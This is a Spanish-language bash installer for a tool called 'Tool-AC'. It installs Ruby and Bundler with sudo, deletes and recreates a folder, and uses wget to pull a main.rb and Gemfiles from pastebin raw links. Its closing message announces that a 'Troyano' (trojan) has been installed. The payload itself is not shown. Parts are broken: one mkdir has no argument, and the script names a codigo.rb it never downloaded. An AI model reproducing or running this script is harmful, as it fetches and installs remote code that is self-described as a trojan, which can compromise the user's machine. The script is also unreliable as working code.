#!/bin/bash
echo "Elije tu metodo [apt, pacman, pkg (termux) o yum]"
read pack
clear
echo "                     ┏━━━━┓━━━━━━━━┏┓━━━━━━┏━━━┓┏━━━┓"
echo "                     ┃┏┓┏┓┃━━━━━━━━┃┃━━━━━━┃┏━┓┃┃┏━┓┃"
echo "                     ┗┛┃┃┗┛┏━━┓┏━━┓┃┃━━━━━━┃┃━┃┃┃┃━┗┛"
echo "                     ━━┃┃━━┃┏┓┃┃┏┓┃┃┃━┏━━━┓┃┗━┛┃┃┃━┏┓"
echo "                     ━┏┛┗┓━┃┗┛┃┃┗┛┃┃┗┓┗━━━┛┃┏━┓┃┃┗━┛┃"
echo "                     ━┗━━┛━┗━━┛┗━━┛┗━┛━━━━━┗┛━┗┛┗━━━┛"
echo "                     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "                     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"   
echo "                                                       instalador                                           "

echo "      Que tipo de usuario vas a ser "
echo ""
echo "  1) Usuario normal (PC Linux)"
echo "  2) Usuario normal (Android Termux o ARM)"
echo "  3) Desarrollador"
echo ""
echo "Digita tu opcion:"
read opc

#funciones

usern()
{
	echo "Se instalaran o actualizaran las siguientes dependencias"
	echo "Ruby"
	echo "Bundler"
	echo "Gema colorize"
	echo "Gema tty-platform"
	echo "Gema ipaddr"
	echo "Gema macaddr"
	echo "Gema uri"
	echo "Gema json"
	echo "Estas deacuerdo con esto? [S/n]"
	read ola
	if [ $ola = "n" ]; then
		echo "Es de awebo bro :("
		exit
	else
		echo "Cargando"
	fi
	echo "Instalando dependiendo con tu paqueteria"
	case $pack in "apt") sudo apt-get install ruby && sudo apt-get install bundler;;
	"pacman") sudo pacman -Sy ruby && sudo pacman -Sy bundler;;
	"yum") sudo yum install ruby && sudo yum install bundler;;
	*)
	echo "No hay soporte, no hay sistema joven";;
	esac
	echo "Configurando las carpetas"
	echo "Purgando..."
	rm -R Tool-AC
	echo "Instalando"
	mkdir Tool-AC
	cd Tool-AC
	#ingresar link valido
	wget https://pastebin.com/raw/Wd6GtStE;
	mv Wd6GtStE main.rb;
	wget https://pastebin.com/raw/bsEnkYtK;
	mv bsEnkYtK Gemfile;
	wget https://pastebin.com/raw/6ArXDz8L;
	mv 6ArXDz8L Gemfile.lock;
	mkdir 
	echo "instalando gemas"
	bundle
	echo "Troyano instalado con exito, para potenciarlo ejecuta:"
	echo "'ruby Tool-AC/codigo.rb'"
}
	
usera()
{
	echo "Android"
}
userd()
{
	echo "develop"
}

#separador

case $opc in "1") usern $pack;;
"2") usera ;;
"3") userd $pack;;
*)
echo "No bro..."
esac

